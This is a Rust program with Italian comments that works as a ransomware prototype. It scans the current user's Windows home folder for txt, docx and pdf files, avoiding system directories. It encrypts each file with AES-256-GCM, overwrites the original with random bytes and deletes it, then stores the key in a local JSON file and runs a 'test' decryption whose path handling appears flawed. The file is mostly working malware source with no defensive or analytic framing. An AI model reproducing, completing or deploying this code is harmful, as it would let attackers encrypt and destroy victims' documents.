use aes_gcm::{
    Aes256Gcm, Nonce,
    aead::{Aead, KeyInit},
};
use rand::{Rng, thread_rng};
use serde::{Deserialize, Serialize};
use std::fs::{self, File};
use std::io::{Read, Write};
use std::path::Path;
use uuid::Uuid;
use walkdir::WalkDir;
//commento prova
// Struttura per salvare la chiave AES e metadati
#[derive(Serialize, Deserialize)]
struct KeyData {
    id: String,               // Identificativo unico della sessione
    aes_key: Vec<u8>,         // Chiave AES in chiaro
    files: Vec<FileMetadata>, // Metadati dei file crittografati
}

// Metadati per ogni file crittografato
#[derive(Serialize, Deserialize)]
struct FileMetadata {
    path: String, // Percorso del file crittografato (es. C:\Users\<username>\Documents\doc.txt.enc)
    nonce: Vec<u8>, // Nonce usato per AES-GCM
    extension: String, // Estensione originale (es. txt)
}

fn generate_aes_key() -> Vec<u8> {
    let mut key = [0u8; 32]; // Chiave AES-256 unica per tutti i file
    thread_rng().fill(&mut key);
    key.to_vec()
}

fn encrypt_file(
    path: &str,
    aes_key: &[u8],
) -> Result<(Vec<u8>, Vec<u8>, String), Box<dyn std::error::Error>> {
    // Leggi il contenuto del file
    let mut file = File::open(path)?;
    let mut data = Vec::new();
    file.read_to_end(&mut data)?;

    // Inizializza il cifrario AES-256-GCM
    let cipher = Aes256Gcm::new_from_slice(aes_key)
        .map_err(|e| Box::<dyn std::error::Error>::from(e.to_string()))?;

    // Genera un nonce di 12 byte
    let mut nonce_bytes = [0u8; 12];
    thread_rng().fill(&mut nonce_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);

    // Crittografa i dati
    let ciphertext = cipher
        .encrypt(nonce, data.as_ref())
        .map_err(|e| Box::<dyn std::error::Error>::from(e.to_string()))?;

    // Estrai l'estensione originale
    let extension = Path::new(path)
        .extension()
        .map_or("".to_string(), |ext| ext.to_string_lossy().into_owned());

    // Combina nonce e ciphertext per il salvataggio
    let mut result = nonce_bytes.to_vec();
    result.extend_from_slice(&ciphertext);

    Ok((result, nonce_bytes.to_vec(), extension))
}

fn store_key_data(
    aes_key: Vec<u8>,
    files: Vec<FileMetadata>,
) -> Result<String, Box<dyn std::error::Error>> {
    let key_id = Uuid::new_v4().to_string();
    let key_data = KeyData {
        id: key_id.clone(),
        aes_key,
        files,
    };
    let json = serde_json::to_string(&key_data)?;
    fs::write(format!("key_data_{}.json", key_id), json)?;
    Ok(key_id)
}

fn select_files(root: &str) -> Vec<String> {
    let allowed_extensions = vec!["txt", "docx", "pdf"];
    WalkDir::new(root)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| {
            let path = e.path();
            let path_str = path.to_string_lossy().to_lowercase();
            path.is_file()
                && path.extension().map_or(false, |ext| {
                    allowed_extensions.contains(&ext.to_string_lossy().to_lowercase().as_str())
                })
                && !path_str.contains(r"\windows\")
                && !path_str.contains(r"\program files\")
                && !path_str.contains(r"\program files (x86)\")
                && !path_str.contains(r"\system volume information\")
                && !path_str.contains(r"\appdata\")
        })
        .map(|e| e.path().to_string_lossy().into_owned())
        .collect()
}

fn decrypt_file(
    encrypted_data: &[u8],
    aes_key: &[u8],
    nonce: &[u8],
) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let cipher = Aes256Gcm::new_from_slice(aes_key)
        .map_err(|e| Box::<dyn std::error::Error>::from(e.to_string()))?;
    let nonce = Nonce::from_slice(nonce);
    let plaintext = cipher
        .decrypt(nonce, encrypted_data)
        .map_err(|e| Box::<dyn std::error::Error>::from(e.to_string()))?;
    Ok(plaintext)
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Ottieni il nome utente corrente e costruisci il percorso della directory utente
    // Usa USER per Linux/macOS e USERNAME per Windows
    let username = std::env::var("USER").or_else(|_| std::env::var("USERNAME"))?;
    let target_dir = format!(r"C:\Users\{}", username);

    // Genera chiave AES unica
    let aes_key = generate_aes_key();

    // Seleziona file importanti in tutte le sottocartelle della directory utente
    let files = select_files(&target_dir);
    let mut file_metadata = Vec::new();

    // Crittografa i file
    for file in files {
        let (encrypted_data, nonce, extension) = encrypt_file(&file, &aes_key)?;
        let encrypted_path = format!("{}.enc", file);
        fs::write(&encrypted_path, encrypted_data)?;

        // Sovrascrivi il file originale con dati casuali e rimuovilo
        let mut rng = thread_rng();
        let random_data: Vec<u8> = (0..1024).map(|_| rand::random::<u8>()).collect(); // 1KB di dati casuali
        fs::write(&file, random_data)?;
        fs::remove_file(&file)?;

        file_metadata.push(FileMetadata {
            path: encrypted_path,
            nonce,
            extension,
        });
    }

    // Salva la chiave AES e metadati
    let key_id = store_key_data(aes_key.clone(), file_metadata)?;
    println!(
        "Chiave salvata con ID: {} in key_data_{}.json",
        key_id, key_id
    );

    // Simula decrittografia (per test)
    let key_data: KeyData =
        serde_json::from_str(&fs::read_to_string(format!("key_data_{}.json", key_id))?)?;
    for file in key_data.files {
        let encrypted_data = fs::read(&file.path)?;
        // I primi 12 byte sono il nonce, il resto è il testo cifrato
        let decrypted_data = decrypt_file(&encrypted_data[12..], &key_data.aes_key, &file.nonce)?;
        let original_path = file.path.replace(".enc", &format!(".{}", file.extension));
        fs::write(&original_path, decrypted_data)?;
        println!("Decrittografato: {}", original_path);
    }

    Ok(())
}
